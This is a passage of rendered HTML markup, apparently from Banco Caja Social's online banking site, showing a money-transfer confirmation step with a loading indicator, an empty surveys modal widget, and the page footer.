                                                                                    <div class="step-connector" data-ng-show="$index &gt; 0" data-ng-style="{&#39;width&#39;: (100 / ($ctrl.config.steps - 1)) + &#39;%&#39;, 
	    			&#39;right&#39;: (100 - (100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" aria-hidden="false" style="width: 50%; right: 0%;"></div>
                                                                                    <div class="step-dot" data-ng-style="{&#39;left&#39;: ((100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" style="left: 100%;">
                                                                                        <span class="ng-binding">3</span>
                                                                                        <i class="icon-bcs icon-check-1"></i>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </ui-bcs-tx-step-indicator-ng>
                                                                    <div data-ng-switch="state.currentStep.name">
                                                                        <div data-ng-switch-when="confirmation" class="ng-scope">
                                                                            <div data-ng-include="&#39;#ext-bcs-tx-ti-enviar-dinero-ng/confirmation.html&#39;" class="ng-scope">
                                                                                <div class="bcs-tx-card-subtitle-section light ng-scope">
                                                                                    <i class="icon-bcs icon-transfer-3"></i>
                                                                                    <h2 class="ng-binding"></h2>
                                                                                </div>
                                                                                <div class="card-body bcs-form ng-scope">
                                                                                    <ui-bb-loading-indicator-ng data-is-loading="state.saveTransferLoading" data-loading-text="Cargando..." class="ng-isolate-scope">
                                                                                        <!-- ngIf: $ctrl.showComponent -->
                                                                                        <div data-ng-if="$ctrl.showComponent" class="jumbotron text-center ng-binding ng-scope">Cargando...
                                                                                        </div>
                                                                                        <!-- end ngIf: $ctrl.showComponent -->
                                                                                        <!-- ngIf: !$ctrl.showComponent -->
                                                                                    </ui-bb-loading-indicator-ng>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <!-- end ngSwitchWhen: -->
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </ng-include>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="bp-widget-foot"></div>
                                    </div>
                                </div>
                                <div data-pid="widget-bcs-tx-visualizar-encuestas-6628582" class="bp-widget bp-ui-dragRoot">
                                    <div class="bp-widget-head"></div>
                                    <div class="bp-widget-pref"></div>
                                    <div class="bp-widget-body ng-scope">
                                        <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                            <div class="widget-bcs-tx-visualizar-encuestas">
                                                <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                                    <!-- ngInclude: -->
                                                    <ng-include src="ext.helpers.template" class="ng-scope">
                                                        <div class="ext-bcs-tx-visualizar-encuestas bcs-payment-view ng-scope" data-ng-controller="TxVisualizarEncuestasController as $ctrl">
                                                            <ui-bb-modal-ng data-is-open="state.openModal" data-animation="true" data-size="&#39;bcs-confirmation&#39;" data-backdrop="&#39;static&#39;" data-keyboard="false" class="ng-scope"></ui-bb-modal-ng>
                                                            <ui-bb-modal-ng data-is-open="state.openEncuestas" data-animation="true" data-size="&#39;bcs-confirmation&#39;" data-backdrop="&#39;static&#39;" data-keyboard="false" class="ng-scope"></ui-bb-modal-ng>
                                                        </div>
                                                    </ng-include>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="bp-widget-foot"></div>
                                </div>
                            </main>
                        </div>
                        <div data-pid="widget-bcs-tx-footer-ng-4814659" class="bp-widget bp-ui-dragRoot">
                            <div class="bp-widget-head"></div>
                            <div class="bp-widget-pref"></div>
                            <div class="bp-widget-body ng-scope">
                                <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                    <div class="widget-bcs-tx-footer-ng">
                                        <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                            <!-- ngInclude: -->
                                            <ng-include src="ext.helpers.template" class="ng-scope">
                                                <div class="ext-bcs-tx-footer-ng ng-scope" data-ng-controller="TxFooterController as $ctrl">
                                                    <footer id="bcs-footer" class="row-table d-print-none">
                                                        <div class="footer-container col-cell">
                                                            <div class="row-table info">
                                                                <div class="bcs-footer-priv-copyright col-cell">
                                                                    <span class="ng-binding">© 2017 Caja Social </span>
                                                                </div>
                                                                <div class="bcs-footer-phone-section">
                                                                    <div class="bcs-footer-priv-icon">
                                                                        <i class="icon-bcs icon-call-3"></i>
                                                                        <span class="ng-binding">Línea Amiga</span>
                                                                    </div>
                                                                    <div class="bcs-footer-priv-phones"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </footer>
                                                </div>
                                            </ng-include>
</body>

</html>